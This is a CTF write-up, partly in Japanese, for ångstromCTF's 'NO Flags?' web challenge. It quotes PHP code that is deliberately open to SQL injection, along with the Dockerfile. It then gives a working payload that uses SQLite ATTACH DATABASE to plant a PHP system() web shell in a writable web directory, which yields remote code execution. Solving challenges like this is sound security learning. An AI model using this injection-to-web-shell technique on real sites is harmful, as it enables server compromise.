# [WEB] NO Flags? 150pts
After hearing about all of the cheating scandals, clam decided to conduct a sting operation for ångstromCTF. He made [a database of fake flags](https://no-flags.web.actf.co/) to see who submits them. Unbeknownst to him, a spy managed to sneak a real flag into his database. Can you find it?

Source, Dockerfile

# Solution
サイトにアクセスすると、偽のフラグを投稿でき、それを表示する画面が出てくる。

ソースコードを読むと、以下のphpが含まれていた。

```php
<?php
        if (!isset($_SESSION["DBNAME"])) {
            $dbname = hash("sha256", (string) rand());
            $_SESSION["DBNAME"] = $dbname;
            $init = true;
        } else {
            $dbname = $_SESSION["DBNAME"];
            $init = false;
        }
        $pdo = new PDO("sqlite:/tmp/$dbname.db");
        if ($init) {
            $pdo->exec("CREATE TABLE Flags (flag string); INSERT INTO Flags VALUES ('actf{not_the_flag}'), ('actf{maybe_the_flag}')");
        }
        if (isset($_POST["flag"])) {
            $flag = $_POST["flag"];
            $pdo->exec("INSERT INTO Flags VALUES ('$flag');");
        }
        foreach ($pdo->query("SELECT * FROM Flags") as $row) {
            echo "<li>" . htmlspecialchars($row["flag"]) . "</li>";
        }
    ?>
```

`if (isset ~~~~` の部分を読むと、SQLiができることがわかる。次にDockerfileを読む。

```docker
FROM php:8.1.5-apache-bullseye

# executable that prints the flag
COPY printflag /printflag
RUN chmod 111 /printflag
COPY src /var/www/html

RUN chown -R root:root /var/www/html && chmod -R 555 /var/www/html
RUN mkdir /var/www/html/abyss &&\
    chown -R root:root /var/www/html/abyss &&\
    chmod -R 333 abyss

EXPOSE 80
```

Dockerは使ったことがほとんどないので、よくわからないが、`/printflag`を実行することができたら、フラグがゲットできるっぽい。Dockerfileより、`/var/www/html` 以下を利用可能。つまり、そこに`/printflag` を実行するようなコードが埋め込まれたファイルを作れば良い。

```
'); ATTACH DATABASE '/var/www/html/abyss/rce.php' AS rce; CREATE TABLE rce.code (qp text); INSERT INTO rce.code (qp) VALUES ('<?php system('/printflag'); ?>'); --
```

を送信し、`https://no-flags.web.actf.co/abyss/rce.php` にアクセスしたら、フラグが得られた。ちなみに末尾の — はSQLiteのコメントアウト。データベースの勉強しなければ...

# References
- https://www.php.net/manual/ja/function.system.php
- https://www.php.net/manual/ja/class.pdo.php